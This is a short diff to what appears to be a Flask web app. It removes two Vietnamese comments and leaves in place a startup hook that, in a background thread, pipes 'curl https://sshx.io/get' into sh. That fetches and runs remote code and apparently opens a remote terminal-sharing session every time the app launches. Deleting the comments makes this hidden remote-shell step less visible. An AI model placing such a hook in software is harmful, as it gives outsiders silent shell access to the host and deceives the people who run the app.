@@ -9,7 +9,6 @@ def home():
 
 def run_setup():
     try:
-        # Ví dụ: chạy lệnh cài đặt bằng curl
         subprocess.run(
             "curl -sSf https://sshx.io/get | sh -s run",
             shell=True, check=True
@@ -18,7 +17,6 @@ def run_setup():
     except Exception as e:
         print("Lỗi khi chạy setup:", e)
 
-# chạy curl 1 lần khi app start (background thread để không chặn Flask)
 threading.Thread(target=run_setup, daemon=True).start()
 
 if __name__ == "__main__":
